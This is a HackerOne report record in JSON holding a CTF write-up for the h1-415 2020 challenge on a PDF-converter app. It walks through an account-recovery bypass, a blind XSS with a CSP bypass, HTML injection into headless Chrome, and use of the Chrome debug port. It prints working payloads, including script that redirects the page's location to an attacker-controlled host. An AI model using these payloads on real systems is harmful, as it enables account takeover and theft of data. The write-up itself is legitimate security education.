{"id":779113,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83NzkxMTM=","url":"https://hackerone.com/reports/779113","title":"[h1-415 2020] @_bayotop h1-415-ctf writeup","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2020-01-21T14:36:13.357Z","submitted_at":"2020-01-21T14:36:13.357Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"bayotop","url":"/bayotop","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/036/633/10a34b6ba8511f5ae6c9664bafcd04aeb25982f8_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":46757,"url":"https://hackerone.com/h1-ctf","handle":"h1-ctf","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"h1-ctf","twitter_handle":"Hacker0x01","website":"","about":"todayisnew reached 100K rep. Let's celebrate with a CTF!"}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-02-03T22:32:09.744Z","bug_reporter_agreed_on_going_public_at":"2020-02-03T22:32:09.707Z","team_member_agreed_on_going_public_at":"2020-02-03T20:36:01.013Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## TL;DR:\n\nThanks for the challenge!\n\n1. Abusing account recovery via QR codes to get access to jobert@mydocz.cosmic.\n2. Blind XSS in `/support/review/\u003creview_id\u003e` (including CSP bypass).\n3. Missing input sanitization on `name` parameter when POSTing to `/support/review/\u003creview_id\u003e`.\n4. Access to remote debugging port on local Chrome instance leaking ID of secret document.\n5. **h1ctf{y3s_1m_c0sm1c_n0w}**\n\nI also included a python script F691360 which is going through the whole challenge (it's a result of a number of scripts I used to automate repetitive tasks).\n\n## Details\n\n### Introduction\n\nhttps://h1-415.h1ctf.com hosted a simple web application allowing to convert images into PDF files. Anyone could register a trial account. Signing in would give access to the converter and basic account management which allowed only a name change. The converter allowed to upload JPG and PNG files only. The resulting PDF would include the uploaded image and the user's name.\n\n### Step 1 - One '{' is all it takes.\n\nAfter a few attempts to include HTML in my user name (`\u003c` and `\u003e` were filtered) or trying to upload arbitrary files, both ways seemed as dead ends. I decided to focus on the account recovery flow. \n\nAfter a successful registration, the application would generate a QR code for account recovery. The QR code was a string in the following format:\n\n```\nascii_hex(user@example.com):\u003csome_random_secret_in_hex\u003e\n```\n\nAfter submitting the QR code to `/recover`, the applicaion would respond with a new session giving access to the user account. After some trial and error, I noticed that the application would right-strip `{` (and any subsequent `{` and `}`) characters from the email when generating the QR code.\n\nThis meant that registering with `jobert@mydocz.cosmic{` would give back a valid QR code for `jobert@mydocz.cosmic`.\n\n### Step 2 - Wow that's cosmic.\n\nAfter logging in as `jobert@mydocz.cosmic` the support chat would became available as Jobert was a proper customer. The first thing I did was sending `flag` into the support chat. The response was as follows:\n\n```\n{\"response\":\"I love flags! Where is yours? Wait... I think someone is converting top secret documents as we speak!\"}\n```\n\nThis response would led me to the deepest rabbit hole I've ever went down. \n\nAnyway, inspecting the JavaScript files included in the page, I learned that it's possible to end the chat with `quit` or `finish`. Once a chat ended, the application would ask for feedback, claiming that a negative, 1-star feedback would be reviewed by support staff. This just begs for blind XSS.\n\nSubmitting a simple XSS payload would confirm that vulnerability on the current page. However, there was a CSP preventing inline script execution:\n\n```\nContent-Security-Policy: default-src 'self'; object-src 'none'; script-src 'self' https://raw.githack.com/mattboldt/typed.js/master/lib/; img-src data: *\n```\n\nSeeing that CSP instantly reminded me of [Micha≈Ç Bentkowski's tweet](https://twitter.com/SecurityMB/status/1162690916722839552). It turns out that raw.githack.com would decode the URL path and therefore it was trivial to bypass using:\n\n```\n\u003cscript src='https://raw.githack.com/mattboldt/typed.js/master/lib%252f..%252f..%252f..%252f..%252fbayotop/playground/master/g2.js'\u003e\u003c/script\u003e\n```\n\nThe first payload that I used was `fetch('https://\u003cdomain-under-my-control\u003e')` to confirm the vulnerability. However, because of the `default-src` directive it wasn't possible to make connections other than to `self` (`connect-src`). I ended up bypassing this via `window.location = 'https://\u003cdomain-under-my-control\u003e'`.\n\nAs you can see [in my commit history](https://github.com/bayotop/playground/commits/master) I was stuck at this point for quite a while. The page was rendered in a headless Chrome instance without an authenticated session. As it turned out, the only information needed to proceed to the next step was a glimpse on the DOM and `window.location`.\n\n### Step 3 - One HTML injection isn't enough. \n\nThe DOM revealed that the support stuff had the ability to change a user's name. Using any authenticated session, it was possible to change any user name except for users with ids 1 and 2. Moreover, the name wasn't sanitized this time! This allowed to change a user's name to HTML that would be rendered during the PDF conversion. I quickly confirmed this using `\u003ciframe src='https://\u003cdomain-under-my-control\u003e'\u003e\u003c/iframe\u003e`. Afterwards, I used a different payload - `\u003cscript\u003ewindow.location='http://ip-under-my-control'+window.location\u003c/script\u003e` - to learn the context I was in. \n\nIt was `http://localhost:3000/converter/\u003crandom-id\u003e.png?user_name=\u003cuser_name\u003e`. This meant that I couldn't simply access `file://`.\n\n### Step 4 - The \"secret\" was 9222.\n\nAt this point I got stuck for a long long time. I tried to find other services listening locally (using [aquatone's xlarge list](https://github.com/michenriksen/aquatone)). I was looking for parameter injection through the user name trying to inject `--allow-file-access-from-file` when starting the Chrome instance. I tried to discover new endpoints and look for differences on existing ones when served locally.\n\nI had a lightbulb moment: `I think someone is converting top secret documents as we speak!`. Was the support chat message a hint? It had to be user with id 1. Using the registration form, I figured that the user's username and email were `admin` and `admin@mydocz.cosmic`). It wasn't possible to recover into that account. It all made sense. I had to use the support staff's endpoint to change the admin's user name to `\u003cscript\u003ewindow.location='http://\u003cip-under-my-control\u003e'\u003c/script\u003e` and wait for the admin to upload a file. I tried SQL, NoSQL, XPath injections. I tried path traversal ([jobert's older tweet](https://twitter.com/jobertabma/status/1071091295425191937) was a really good candidate). I tried all possible encodings. The application was kind of slow to respond and after every 500 it would timeout for a few minutes, so all of this took ages. Nothing worked.\n\nWhile doing my fuzzing I have accidentally overwritten the user name of a bunch other users. At least one noticed as they sent me a message:\n\n```\n/var/log/nginx/access.log ... \"GET /?x=stop_messing_with_mydocz_account_im_jobert_and_i_need_it HTTP/1.1\" ...\n/var/log/nginx/access.log ... \"GET /?x=see_you_in_San_Francisco HTTP/1.1\" ...\n/var/log/nginx/access.log ... \"GET /?x=but_Im_gonna_snatch_the_swag_pack HTTP/1.1\" ...\n```\n\nI'm super sorry for interfering! Hopefully I didn't cause too much harm. Please let me know if you managed to grab that swag pack (ideally once we meet in SF :)).\n\nI started to realize this wouldn't work, however, I had no other ideas. Until I saw these 2 messages in a Slack thread (thanks [@soiaxx](https://twitter.com/soiaxx)):\n\n```\nif it's chrome headless and u can see the generated pdf, and u can access the devtools port on localhost:9222 by default.... you can access file:// :stuck_out_tongue:\nif you can run javascript :smile: so much ifs\n```\n\n*For the sake of transparency, it was a completely unrelated thread. I'm not sure if the involved parties knew about this particular CTF.*\n\nI tried setting my user name to `\u003ciframe width=900 height=900 src=\"http://localhost:9222/\"\u003e\u003c/iframe\u003e` and uploaded a file. It worked, it rendered two words: \"Inspectable WebContents\". [This StackOverflow answer](https://stackoverflow.com/a/29893173/5136654) mentions a `/json` endpoint showing available debug targets. Jackpot:\n\n{F691310}\n\nRequesting https://h1-415.h1ctf.com/documents/0d0a2d2a3b87c44ed13e0cbfc863ad4322c7913735218310e3d9ebe37e6a84ab would reveal the flag: **h1ctf{y3s_1m_c0sm1c_n0w}**.\n\n## Impact\n\nMostly sleep deprivation.","weakness":{"id":75,"name":"Privilege Escalation"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":691310,"file_name":"debug-json.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/4fmzsc6rwuxakCkALxMLWoMo?response-content-disposition=attachment%3B%20filename%3D%22debug-json.png%22%3B%20filename%2A%3DUTF-8%27%27debug-json.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQXEQ3VCGF%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T152635Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCIQCNbr25hK1JC2i73IX5uE08m1agZwA%2BCyxTPtXmxpZHFAIgA9v21iU9rOtKWjxfMHo7kqQOL4Y8ABbAnucRVLpaC9cqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDOyim%2FBwzSkIWBPCWirXA1TUfPlTIAz6iDfoaiiMP8hivTDD8uDyRJ%2FoAF5UW%2F6cSrWHj2Mtt%2Fx8tKTYSGoQiyhUdi%2BFdxLY35ZRGqE5k10GcpBa5q9ivBUHzTLtIbzvkVLjo0GDs33RjPyv8lT8%2BIT3cR1GpHz5sKugzk1wJHpaXHIGV7TsNZTez5PsxRWLAbodD46%2Bv0aY9dXICvo8Bld1OIiDoUsI3sX2R7SAEjL0B45opfmY7Hh4KKVF9KyCf7etmcGEL0U%2Bjij5TfmuHRxoVJXFKR4WbBKoHXN3cL5AQhAkGBE5bmE6cTsvfhMkCltMfmR1OmQtt1QK7fs2YWSyJhNNnjgzseVzroJk8qcktNvGQQNtmAz%2F0hi%2BbLDdR3r35MBTZtRPxGxwfYKfk%2Blyikhar%2F%2FfPxr6sJoQhbcKSjiziR8cFwFPC97f3qfgH6sVJVvH5AClhLDj9FMqequ01uI1FMQI%2BQ1BJ1t%2Bl3dX7D09OZCMRrk3HvidiN7al4fmx5e0pKMz7tbb23gSzvgiMJbXeHgATiARA8dz6JIoLosFubesB7ZLWq9owsMVaP42CuihB%2Br9J9vu1HkgY4lcWvgRt8bqCjXjWDPBzlNcnc9D32bMJUDfp2BWdJ0BCnpEi4XjrDCyiJGLBjqlAbw%2BQzzkBo5pgpwg2B9K3Kb9khz80zQhxWTR4UFlyZpApeXe135MxtRrVWf1VeEC8qBZynSiicNEE5qSEPmd%2FKNSihzfYJ9PmbUkfZN9yFsrIArapjiCpWMywbnOVNeLSHMFFv8xtfh0sOTI4VetTtHS5BxyHny%2BvnXM6Hjudg5tfOAvbwkv9j%2BTfq0Y0YGFWvyUNrCeX3Y3zQ5t8ked%2FqOvxUSYeg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=cc2796c6c1ae2faea3c2ccd373c830afbe95cd38682181d771c3d2419eb595af","file_size":631884,"type":"image/png"},{"id":691360,"file_name":"exploit.py","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/eRxXzsN1hdYGJtVQwe38wL6z?response-content-disposition=attachment%3B%20filename%3D%22exploit.py%22%3B%20filename%2A%3DUTF-8%27%27exploit.py\u0026response-content-type=text%2Fx-python-script\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQXEQ3VCGF%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T152635Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCIQCNbr25hK1JC2i73IX5uE08m1agZwA%2BCyxTPtXmxpZHFAIgA9v21iU9rOtKWjxfMHo7kqQOL4Y8ABbAnucRVLpaC9cqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDOyim%2FBwzSkIWBPCWirXA1TUfPlTIAz6iDfoaiiMP8hivTDD8uDyRJ%2FoAF5UW%2F6cSrWHj2Mtt%2Fx8tKTYSGoQiyhUdi%2BFdxLY35ZRGqE5k10GcpBa5q9ivBUHzTLtIbzvkVLjo0GDs33RjPyv8lT8%2BIT3cR1GpHz5sKugzk1wJHpaXHIGV7TsNZTez5PsxRWLAbodD46%2Bv0aY9dXICvo8Bld1OIiDoUsI3sX2R7SAEjL0B45opfmY7Hh4KKVF9KyCf7etmcGEL0U%2Bjij5TfmuHRxoVJXFKR4WbBKoHXN3cL5AQhAkGBE5bmE6cTsvfhMkCltMfmR1OmQtt1QK7fs2YWSyJhNNnjgzseVzroJk8qcktNvGQQNtmAz%2F0hi%2BbLDdR3r35MBTZtRPxGxwfYKfk%2Blyikhar%2F%2FfPxr6sJoQhbcKSjiziR8cFwFPC97f3qfgH6sVJVvH5AClhLDj9FMqequ01uI1FMQI%2BQ1BJ1t%2Bl3dX7D09OZCMRrk3HvidiN7al4fmx5e0pKMz7tbb23gSzvgiMJbXeHgATiARA8dz6JIoLosFubesB7ZLWq9owsMVaP42CuihB%2Br9J9vu1HkgY4lcWvgRt8bqCjXjWDPBzlNcnc9D32bMJUDfp2BWdJ0BCnpEi4XjrDCyiJGLBjqlAbw%2BQzzkBo5pgpwg2B9K3Kb9khz80zQhxWTR4UFlyZpApeXe135MxtRrVWf1VeEC8qBZynSiicNEE5qSEPmd%2FKNSihzfYJ9PmbUkfZN9yFsrIArapjiCpWMywbnOVNeLSHMFFv8xtfh0sOTI4VetTtHS5BxyHny%2BvnXM6Hjudg5tfOAvbwkv9j%2BTfq0Y0YGFWvyUNrCeX3Y3zQ5t8ked%2FqOvxUSYeg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=b741687e7c81a100d2b96e47668cb191b2a8df18d97be0d21252686b5758a1cd","file_size":3165,"type":"text/x-python-script"}],"allow_singular_disclosure_at":"2020-03-04T20:36:01.338Z","allow_singular_disclosure_after":-50611833.821777634,"singular_disclosure_allowed":true,"vote_count":7,"voters":["nytr0gen","checkm50","wh0ru","janmasarik","0xacb","nukedx","b9372d4605459ca97219795"],"severity":{"rating":"critical","author_type":"User"},"structured_scope":{"databaseId":42751,"asset_type":"URL","asset_identifier":"https://h1-415.h1ctf.com","max_severity":"none"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":6830492,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"#","automated_response":false,"created_at":"2020-01-21T18:16:11.634Z","updated_at":"2020-01-21T18:16:11.634Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":6852644,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey there,\n\nJust a quick reminder to not post any writeups online until we announce the winners and request disclosure on your submission. \n\nThanks! ","automated_response":false,"created_at":"2020-01-23T18:13:03.578Z","updated_at":"2020-01-23T18:13:03.578Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":6934819,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello Hackers! \n\nI just wanted to update everyone that we are in the process of selecting our winners. We should have an announcement out early next week! Thank you for your patience and happy hacking! ","automated_response":false,"created_at":"2020-01-31T18:04:59.384Z","updated_at":"2020-01-31T18:04:59.384Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":6953831,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","automated_response":false,"created_at":"2020-02-03T20:32:39.382Z","updated_at":"2020-02-03T20:32:39.382Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"reporter":{"username":"bayotop","url":"/bayotop"},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":6953867,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-02-03T20:36:01.082Z","updated_at":"2020-02-03T20:36:01.082Z","first_to_agree":true,"actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":6954757,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-02-03T22:32:09.724Z","updated_at":"2020-02-03T22:32:09.724Z","actor":{"username":"bayotop","cleared":false,"url":"/bayotop","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/633/10a34b6ba8511f5ae6c9664bafcd04aeb25982f8_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6954758,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2020-02-03T22:32:09.760Z","updated_at":"2020-02-03T22:32:09.760Z","actor":{"username":"bayotop","cleared":false,"url":"/bayotop","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/633/10a34b6ba8511f5ae6c9664bafcd04aeb25982f8_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8236806,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","automated_response":false,"created_at":"2020-06-08T21:12:29.503Z","updated_at":"2020-06-08T21:12:29.503Z","additional_data":{"old_title":"@_bayotop h1-415-ctf writeup","new_title":"[h1-415 2020] @_bayotop h1-415-ctf writeup"},"actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}